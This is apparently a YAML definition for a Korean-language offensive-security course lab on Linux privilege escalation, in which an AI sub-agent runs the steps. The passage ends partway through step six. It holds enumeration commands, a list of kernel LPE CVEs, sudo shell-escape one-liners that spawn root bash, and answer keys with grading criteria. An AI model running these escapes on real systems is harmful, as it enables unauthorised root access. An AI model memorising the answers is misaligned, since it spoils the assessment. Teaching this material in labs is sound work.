lab_id: attack-adv-ai-week06
title: 권한 상승 체인 (AI 지원)
version: ai
course: attack-adv-ai
week: 6
description: Linux 시스템에서 초기 접근 권한으로부터 root 권한까지 다단계 권한 상승을 수행한다. SUID 바이너리, 커널 취약점,
  sudo 오설정, cron 악용 등 다양한 권한 상승 벡터를 체이닝한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: hard
duration_minutes: 120
objectives:
- Linux 권한 상승 벡터를 체계적으로 열거한다
- SUID, sudo, cron, capabilities 등을 통한 권한 상승을 수행한다
- 다단계 권한 상승 체인을 구성한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 현재 사용자의 권한 정보를 수집하라. id, whoami, groups, sudo -l 명령을 실행하여 초기 권한 수준을
    확인하라.
  hint: id, groups, sudo -l 명령으로 현재 권한과 사용 가능한 sudo 규칙을 확인한다
  category: recon
  points: 5
  answer: '🤖 프롬프트: 현재 사용자의 권한 정보를 수집하라. id, whoami, groups, sudo -l 명령을 실행하여 초기 권한
    수준을 확인해줘

    📎 참고 (CLI): id && whoami && groups && sudo -l 2>&1 | head -20'
  answer_detail: 권한 상승의 첫 단계는 현재 권한 수준을 파악하는 것이다. id 명령은 UID/GID와 소속 그룹을, sudo -l은
    비밀번호 없이 실행 가능한 명령을 보여준다. docker, lxd, disk 그룹 소속은 그 자체로 root 획득이 가능한 경우가 많다.
  verify:
    type: output_contains
    expect: uid=
    field: stdout
    semantic:
      intent: 초기 접근 후 권한 상승 정찰의 1단계 — 현재 사용자의 UID/GID, 그룹 소속, sudo 권한 등 기본 권한 정보 수집
      success_criteria:
      - id 또는 whoami 실행 결과 (uid= 형식) 포함
      - groups 명령 결과로 소속 그룹 나열
      - sudo -l 실행 결과 해석 — 비밀번호 없이 가능한 명령 확인
      acceptable_methods:
      - id && whoami && groups && sudo -l 체인 실행
      - python os.getuid/os.getgroups 로 동등 정보 수집
      - linpeas.sh/linenum.sh 자동 열거 스크립트 결과 첫 구간
      - Windows whoami /all 동등 명령 설명 (교차환경 대비)
      negative_signs:
      - id/whoami 중 하나만 (그룹·sudo 미확인)
      - sudo -l 패스워드 필요로 실패하고 대체 없이 중단
      - 로그인 실패·무응답만 출력
  target_vm: attacker
  script: id && whoami && groups && sudo -l 2>&1 | head -20
  risk_level: low
  bastion_prompt: '현재 사용자의 권한 정보를 수집하라. id, whoami, groups, sudo -l 명령을 실행하여 초기 권한
    수준을 확인해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 2
  instruction: SUID 비트가 설정된 바이너리를 시스템 전체에서 검색하라. GTFOBins에서 활용 가능한 바이너리를 식별하라.
  hint: find / -perm -4000 -type f 명령으로 SUID 바이너리를 검색한다
  category: recon
  points: 10
  answer: '🤖 프롬프트: SUID 비트가 설정된 바이너리를 시스템 전체에서 검색하라. GTFOBins에서 활용 가능한 바이너리를 식별해줘

    📎 참고 (CLI): find / -perm -4000 -type f 2>/dev/null | head -20'
  answer_detail: SUID(Set User ID) 비트가 설정된 바이너리는 소유자(보통 root) 권한으로 실행된다. find, vim,
    nmap, python, bash 등에 SUID가 설정되어 있으면 GTFOBins(https://gtfobins.github.io)의 기법을
    사용하여 root 셸을 획득할 수 있다. 비표준 SUID 바이너리는 특히 위험하다.
  verify:
    type: output_contains
    expect: /usr/
    field: stdout
    semantic:
      intent: SUID 비트 설정된 바이너리 전체 검색 — GTFOBins 에 등록된 exploitable 바이너리 식별
      success_criteria:
      - find / -perm -4000 -type f 2>/dev/null 명령 실행
      - SUID 바이너리 목록 출력(/usr/bin/... 등 경로 최소 5 개 포함)
      - GTFOBins 관점에서 exploitable 한 항목(vim/find/python/nmap 등) 언급 또는 식별
      acceptable_methods:
      - find / -perm -4000 -type f 직접 실행
      - find / -perm -u+s -type f
      - getcap 과 함께 병행 실행
      - linpeas/linux-exploit-suggester 등 자동화 도구
      negative_signs:
      - SUID 대신 다른 권한(SGID/일반 권한)만 검색
      - 검색 결과 없이 개념만 설명
      - GTFOBins 활용 가능 바이너리 언급 누락
  target_vm: attacker
  script: find / -perm -4000 -type f 2>/dev/null | head -20
  risk_level: low
  bastion_prompt: 'SUID 비트가 설정된 바이너리를 시스템 전체에서 검색하라. GTFOBins에서 활용 가능한 바이너리를 식별해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 3
  instruction: 커널 버전을 확인하고, 알려진 커널 취약점을 검색하라. uname -a와 cat /proc/version 명령으로 정보를
    수집하라.
  hint: 커널 버전으로 DirtyCow, DirtyPipe 등 알려진 LPE 취약점을 검색한다
  category: recon
  points: 10
  answer: '🤖 프롬프트: 커널 버전을 확인하고, 알려진 커널 취약점을 검색하라. uname -a와 cat /proc/version 명령으로
    정보를 수집해줘

    📎 참고 (CLI): uname -a && cat /proc/version && echo ''---'' && echo ''Known kernel
    LPE vulnerabilities:'' && echo ''CVE-2016-5195 DirtyCow: Linux < 4.8.3'' && echo
    ''CVE-2022-0847 DirtyPipe: Linux 5.8 - 5.16.11'' && echo ''CVE-2021-4034 PwnKit:
    polkit pkexec (any version)'' && echo ''CVE-2023-0386 OverlayFS: Linux < 6.2'''
  answer_detail: 커널 취약점은 가장 강력한 권한 상승 벡터이다. 커널 버전을 확인한 후 exploit-db, searchsploit
    등에서 매칭되는 LPE(Local Privilege Escalation) 취약점을 검색한다. DirtyCow(CVE-2016-5195), DirtyPipe(CVE-2022-0847),
    PwnKit(CVE-2021-4034)은 광범위한 커널 버전에 영향을 미치는 대표적 취약점이다.
  verify:
    type: output_contains
    expect: Linux
    field: stdout
    semantic:
      intent: 커널 버전 확인 및 알려진 LPE(DirtyCow/DirtyPipe/PwnKit 등) 취약점 매핑 조사
      success_criteria:
      - uname -a 또는 cat /proc/version 실행으로 커널 버전 노출
      - DirtyCow/DirtyPipe/PwnKit/OverlayFS 중 2개 이상의 CVE ID + 영향 버전 언급
      - 현재 커널이 특정 취약점 적용 범위에 해당하는지 해석
      acceptable_methods:
      - uname -a, cat /proc/version 출력
      - lsb_release -a, hostnamectl 로 배포판 정보 병행
      - searchsploit linux kernel <version>
      - linux-exploit-suggester.sh 자동 매핑
      negative_signs:
      - 커널 버전 노출 없음
      - 취약점 CVE 1개만 또는 영향 범위 없이 나열
      - 우분투/데비안 패키지 버전 검색으로 오인 (커널 아님)
  target_vm: attacker
  script: 'uname -a && cat /proc/version && echo ''---'' && echo ''Known kernel LPE
    vulnerabilities:'' && echo ''CVE-2016-5195 DirtyCow: Linux < 4.8.3'' && echo ''CVE-2022-0847
    DirtyPipe: Linux 5.8 - 5.16.11'' && echo ''CVE-2021-4034 PwnKit: polkit pkexec
    (any version)'' && echo ''CVE-2023-0386 OverlayFS: Linux < 6.2'''
  risk_level: low
  bastion_prompt: '커널 버전을 확인하고, 알려진 커널 취약점을 검색하라. uname -a와 cat /proc/version 명령으로
    정보를 수집해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 4
  instruction: sudo 오설정을 통한 권한 상승을 분석하라. sudo에서 셸 이스케이프가 가능한 프로그램(vim, less, find
    등)의 활용법을 정리하라.
  hint: GTFOBins의 sudo 섹션을 참고하여 셸 이스케이프 기법을 문서화한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: sudo 오설정을 통한 권한 상승을 분석하라. sudo에서 셸 이스케이프가 가능한 프로그램(vim, less, find
    등)의 활용법을 정리해줘

    📎 참고 (CLI): echo ''=== Sudo Shell Escape Techniques ==='' && echo '''' && echo
    ''[vim] sudo vim -c ":!bash"'' && echo ''[less] sudo less /etc/hosts -> !bash''
    && echo ''[find] sudo find / -name x -exec /bin/bash \;'' && echo ''[nmap] sudo
    nmap --interactive -> !sh'' && echo ''[python] sudo python3 -c "import os;os.system("/bin/bash")"''
    && echo ''[awk] sudo awk "BEGIN {system("/bin/bash")}"'' && echo ''[env] sudo
    env /bin/bash'' && echo ''[man] sudo man man -> !bash'' && echo '''' && echo ''Current
    sudo permissions:'' && sudo -l 2>&1 | tail -10'
  answer_detail: sudo로 실행 가능한 프로그램 중 다수가 셸 이스케이프를 허용한다. vim은 :!bash, less는 !bash,
    find는 -exec, python은 os.system() 등으로 root 셸을 획득할 수 있다. 이를 방지하려면 NOEXEC 태그를 사용하거나,
    특정 명령의 인자까지 제한해야 한다.
  verify:
    type: output_contains
    expect: Sudo Shell Escape
    field: stdout
    semantic:
      intent: sudo 오설정을 이용한 셸 이스케이프 — vim/less/find/nmap/python 등 GTFOBins 기법 정리
      success_criteria:
      - sudo 로 실행 가능한 프로그램별 셸 이스케이프 명령 (vim :!bash, less !bash, find -exec 등) 3개 이상
        제시
      - sudo -l 실행으로 현재 환경의 실제 sudo 권한 확인
      - GTFOBins 개념(SUID/sudo 에서 합법 바이너리로 root 셸 획득) 언급
      acceptable_methods:
      - echo/heredoc 으로 기법 목록 작성 + sudo -l 실행
      - linpeas 의 sudo 섹션 결과
      - sudo_exec_bypass Metasploit 모듈 예시
      - 실제 이스케이프 실행(vim :!bash 등)으로 root 확인
      negative_signs:
      - 셸 이스케이프 기법 1개만 나열
      - GTFOBins 개념 언급 없음
      - sudo 설정 파일(/etc/sudoers) 수정만 제시 (이미 root 필요)
  target_vm: attacker
  script: echo '=== Sudo Shell Escape Techniques ===' && echo '' && echo '[vim] sudo
    vim -c ":!bash"' && echo '[less] sudo less /etc/hosts -> !bash' && echo '[find]
    sudo find / -name x -exec /bin/bash \;' && echo '[nmap] sudo nmap --interactive
    -> !sh' && echo '[python] sudo python3 -c "import os;os.system("/bin/bash")"'
    && echo '[awk] sudo awk "BEGIN {system("/bin/bash")}"' && echo '[env] sudo env
    /bin/bash' && echo '[man] sudo man man -> !bash' && echo '' && echo 'Current sudo
    permissions:' && sudo -l 2>&1 | tail -10
  risk_level: medium
  bastion_prompt: 'sudo 오설정을 통한 권한 상승을 분석하라. sudo에서 셸 이스케이프가 가능한 프로그램(vim, less, find
    등)의 활용법을 정리해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 5
  instruction: cron 작업에서 권한 상승 벡터를 찾아라. 시스템 crontab과 사용자 crontab을 검사하고, 월드 writable
    스크립트를 참조하는 항목을 식별하라.
  hint: cat /etc/crontab, ls -la /etc/cron.d/, crontab -l 등으로 스케줄된 작업을 확인한다
  category: recon
  points: 10
  answer: '🤖 프롬프트: cron 작업에서 권한 상승 벡터를 찾아라해줘

    📎 참고 (CLI): echo ''=== Cron Jobs ==='' && cat /etc/crontab 2>/dev/null && echo
    ''---'' && ls -la /etc/cron.d/ 2>/dev/null && echo ''---'' && ls -la /etc/cron.daily/
    2>/dev/null | head -10 && echo ''---'' && echo ''World-writable scripts referenced
    by cron:'' && find /etc/cron* -type f -exec grep -l ''/'' {} \; 2>/dev/null |
    head -5'
  answer_detail: cron 작업이 월드 writable 스크립트를 실행하면, 공격자가 스크립트를 수정하여 root 권한으로 코드를 실행할
    수 있다. PATH 변수 조작(cron의 PATH에 공격자 디렉토리를 추가)이나 와일드카드 인젝션(tar * → --checkpoint 옵션
    삽입)도 가능하다.
  verify:
    type: output_contains
    expect: Cron
    field: stdout
    semantic:
      intent: cron 작업 기반 권한 상승 벡터 탐색 — 시스템/사용자 crontab 및 /etc/cron.* 에서 world-writable
        스크립트 참조 식별
      success_criteria:
      - /etc/crontab 출력 또는 ls /etc/cron.d/, /etc/cron.daily/ 등 결과
      - world-writable 파일 또는 PATH 변조 가능 항목 탐색 (find + grep 조합)
      - cron 관련 LPE 벡터(PATH 하이재킹, 와일드카드 인젝션, writable 스크립트) 최소 1 개 설명
      acceptable_methods:
      - cat /etc/crontab + ls -la /etc/cron.* 조합
      - crontab -l (사용자 본인)
      - linpeas 의 cron 섹션
      - systemctl list-timers (systemd 타이머 대체)
      negative_signs:
      - crontab 이 없어서 아무것도 출력 안함 (대체 조사 없음)
      - 권한 상승 벡터 분석 없이 단순 파일 목록만
      - systemd 전용 환경에서 cron 만 찾고 타이머 미언급
  target_vm: attacker
  script: echo '=== Cron Jobs ===' && cat /etc/crontab 2>/dev/null && echo '---' &&
    ls -la /etc/cron.d/ 2>/dev/null && echo '---' && ls -la /etc/cron.daily/ 2>/dev/null
    | head -10 && echo '---' && echo 'World-writable scripts referenced by cron:'
    && find /etc/cron* -type f -exec grep -l '/' {} \; 2>/dev/null | head -5
  risk_level: low
  bastion_prompt: 'cron 작업에서 권한 상승 벡터를 찾아라해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 6
  instruction: Linux capabilities를 통한 권한 상승을 검색하라. getcap으로 특수 capabilities가 설정된 바이너리를
    찾아라.
  hint: getcap -r / 명령으로 시스템 전체의 capabilities를 검색한다
  category: recon
  points: 10
  answer: '🤖 프롬프트: Linux capabilities(cap_setuid, cap_dac_override, cap_net_raw 등)를
    통한 권한 상승 기법과 getcap 명령으로 위험한 바이너리를 식별하는 방법을 설명해줘

    📎 참고 (CLI): getcap -r / 2>/dev/null | head -20 && echo ''---'' && echo ''Dangerous
    capabilities:'' && echo ''cap_setuid -> Change UID to root'' && echo ''cap_dac_override
    -> Bypass file permission checks'' && echo ''cap_sys_admin -> Mount filesystems,
    debug processes'' && echo ''cap_net_raw -> Raw socket access (packet sniffing)'''
  answer_detail: Linux Capabilities는 root 권한을 세분화한 것이다. cap_setuid+ep가 설정된 python은
    os.setuid(0)으로 root가 되고, cap_dac_override는 모든 파일을 읽을 수 있다. SUID보다 잘 알려지지 않아 관리자가
    간과하는 경우가 많다.
  verify:
    type: output_contains
    expect: cap_
    field: stdout
    semantic:
      intent: Linux capabilities 기반 권한 상승 — getcap 로 cap_setuid/cap_dac_override 등
        위험 capability 설정된 바이너리 식별
      success_criteria:
      - getcap -r / 2>/dev/null 실행 또는 동등 명령
      - cap_setuid/cap_dac_override/cap_sys_admin/cap_net_raw 중 2 개 이상 설명
      - capability 가 SUID 보다 세분화된 권한이며 관리자가 간과한다는 포인트 언급
      acceptable_methods:
      - getcap -r / 직접 실행
      - find / -type f -exec getcap {} + 2>/dev/null
      - python 으로 os.cap_* 검사 스크립트
      - linpeas 의 capabilities 섹션
